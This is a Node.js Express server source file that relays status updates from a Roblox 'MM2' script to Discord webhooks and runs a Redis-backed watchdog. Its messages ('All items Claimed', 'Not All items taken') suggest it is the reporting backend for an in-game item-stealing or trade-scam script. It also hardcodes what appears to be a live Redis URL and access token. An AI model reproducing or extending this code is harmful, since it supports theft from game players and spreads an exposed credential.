const express = require('express');
const { Redis } = require('@upstash/redis');
const axios = require('axios');

const app = express();
app.use(express.json());

const redis = new Redis({
  url: "https://sincere-pika-37791.upstash.io",
  token: "AZOfAAIncDFhMGViOTE2MTRiYjg0ZjRmOWRmNTg4ODViNTNiNDAwMXAxMzc3OTE",
});

// Helper function to edit Discord
async function editDiscord(url, msgId, title, description, color, footerText) {
    try {
        await axios.patch(`${url}/messages/${msgId}`, {
            embeds: [{
                title: title,
                description: `## Status:\n\`\`\`lua\n${description}\n\`\`\``,
                color: color,
                footer: { text: footerText },
                timestamp: new Date().toISOString()
            }]
        });
        console.log(`Successfully edited message: ${msgId} - ${description}`);
    } catch (err) {
        console.error(`Failed to edit Discord: ${err.message}`);
    }
}

// 1. WATCHDOG LOOP: Runs every 15 seconds 24/7
setInterval(async () => {
    try {
        const keys = await redis.keys('hb_*');
        const now = Date.now();
        for (const key of keys) {
            const data = await redis.get(key);
            if (data && (now - data.lastSeen > 70000)) {
                await editDiscord(data.webhookUrl, data.msgId, "Wym's Scripts • MM2", "🔴 Left (Player Left Or Crashed)", 16711680, "Auto-detected timeout");
                await redis.del(key);
            }
        }
    } catch (err) {
        console.error("Watchdog interval error:", err);
    }
}, 15000);

// 2. MAIN ENDPOINT: Roblox calls this
app.post('/', async (req, res) => {
    const { msgId, webhookUrl, action } = req.body;
    console.log(`Action Received: ${action} for ID: ${msgId}`);

    if (!msgId || !webhookUrl) return res.status(400).send("Missing data");

    try {
        if (action === "ping") {
            // Update heartbeat in Redis
            await redis.set(`hb_${msgId}`, { msgId, webhookUrl, lastSeen: Date.now() }, { ex: 3600 });
        } 
        else if (action === "partial") {
            await editDiscord(webhookUrl, msgId, "Wym's Scripts • MM2", "🟡 Partial (Not All items taken)", 16776960, "Partial Progress");
        } 
        else if (action === "stop") {
            // THIS IS THE "CLAIMED" LOGIC
            await editDiscord(webhookUrl, msgId, "Wym's Scripts • MM2", "🟢 Success (All items Claimed)", 65280, "Trade completed successfully!");
            await redis.del(`hb_${msgId}`); // Remove from watchdog so it doesn't turn Red later
        }

        res.status(200).json({ ok: true });
    } catch (err) {
        res.status(500).json({ error: err.message });
    }
});

const PORT = process.env.PORT || 3000;
app.listen(PORT, () => console.log(`Railway Watchdog running on port ${PORT}`));
